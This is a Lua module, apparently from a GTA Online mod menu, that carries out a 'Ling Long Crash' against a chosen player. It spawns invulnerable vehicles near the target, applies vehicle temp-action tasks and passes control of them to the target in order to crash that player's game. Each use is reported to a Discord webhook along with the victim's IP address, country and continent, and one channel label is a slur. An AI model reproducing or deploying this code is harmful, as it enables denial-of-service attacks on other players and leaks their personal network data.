local function createVehicleTemporaryActionCrashModule(moduleContext)
    KSRuntimePlayerFeatureState = KSRuntimePlayerFeatureState or {}
    KSRuntimePlayerFeatureState.largeObjects = KSRuntimePlayerFeatureState.largeObjects or {}
    KSRuntimePlayerFeatureState.dumpedObjectsPID = KSRuntimePlayerFeatureState.dumpedObjectsPID or {}

    local function runVehicleTemporaryActionCrash(playerFeature)
        local targetPlayerId = playerFeature:GetPlayerIndex()
        local targetPlayer = Players.GetById(targetPlayerId)
        if not targetPlayer then
            return
        end
        local targetGamerInfo = targetPlayer:GetGamerInfo()
        if targetPlayerId == nil or targetPlayerId == GTA.GetLocalPlayerId() or not (isDev or isSupporter or isAdmin) then
            return
        end
        if blacklistRIDList[targetGamerInfo.RockstarId] then
            if not isDev then
                blacklistSound()
                SendToDiscord("nogger", ("%s(%i) tried to Crash(Ling Long Crash) a Blacklisted Player (%s)!"):format(
                    Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(),
                    Players.GetName(Utils.GetSelectedPlayer())
                ))
                return
            end
        elseif detectedPlayerReasons[targetPlayerId + 1] == "K-Script User" then
            if not isDev then
                blacklistSound("forbidden_protected_runtime_target")
                SendToDiscord("nogger", ("%s(%i) tried to Crash another K-Script User (%s)!"):format(
                    Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(),
                    Players.GetName(Utils.GetSelectedPlayer())
                ))
                return
            end
        end

        local function logFeatureUse()
            local targetTags = Players.GetTags(targetPlayerId)
            local isTargetFriend = string.find(targetTags, "[F]", 1, true) ~= nil
            local targetIpInfo = Players.GetIPInfo(targetPlayerId)
            local targetIpAddress = Players.GetIP(targetPlayerId):ToString(false)
            SendToDiscord("lol", ("%s used Ling Long Crash against %s with UID %i, isSupporter: %s, is Target Friend?: %s, Target Country: %s, Target Continent: %s, Target IP: %s"):format(
                PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()),
                Players.GetName(Utils.GetSelectedPlayer()), Cherax.GetUID(),
                tostring(isSupporter), tostring(isTargetFriend),
                targetIpInfo.country, targetIpInfo.continent, targetIpAddress
            ))
        end
        log = logFeatureUse
        Script.QueueJob(log)
        onCrashCooldown = true
        local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetPlayerId)
        local targetPosition = getPlayerPosition(targetPlayerId)
        local spawnedVehicles = {}
        for spawnIndex = 1, 5 do
            local spawnedVehicle = GTA.SpawnVehicle(
                Utils.Joaat("envisage"), targetPosition.x, targetPosition.y + 35,
                targetPosition.z + 35, 1, true, true
            )
            if ENTITY.DOES_ENTITY_EXIST(spawnedVehicle) then
                ENTITY.SET_ENTITY_PROOFS(spawnedVehicle, true, true, true, true, true, true, true, true)
                rancolor(spawnedVehicle)
                table.insert(spawnedVehicles, spawnedVehicle)
            end
            Script.Yield(50)
        end
        for _, spawnedVehicle in ipairs(spawnedVehicles) do
            TASK.TASK_VEHICLE_TEMP_ACTION(targetPed, spawnedVehicle, 16, 750)
            TASK.TASK_VEHICLE_TEMP_ACTION(targetPed, spawnedVehicle, 17, 750)
            TASK.TASK_VEHICLE_TEMP_ACTION(targetPed, spawnedVehicle, 18, 750)
            GTA.GiveControl(targetPlayerId, spawnedVehicle)
            Script.Yield(0)
        end
        Script.Yield(1250)
        onCrashCooldown = false
        for _, spawnedVehicle in ipairs(spawnedVehicles) do
            DeleteEnt(spawnedVehicle)
        end
    end

    local vehicleTemporaryActionCrashRunner = { variant = "donator", feature = "TempVehicle1", slug = "tempvehicle1" }

    function vehicleTemporaryActionCrashRunner.run(runContext)
        if type(runContext) ~= "table" or not runContext then
            runContext = {}
        end
        return runVehicleTemporaryActionCrash(runContext.feature)
    end

    return vehicleTemporaryActionCrashRunner
end

return createVehicleTemporaryActionCrashModule
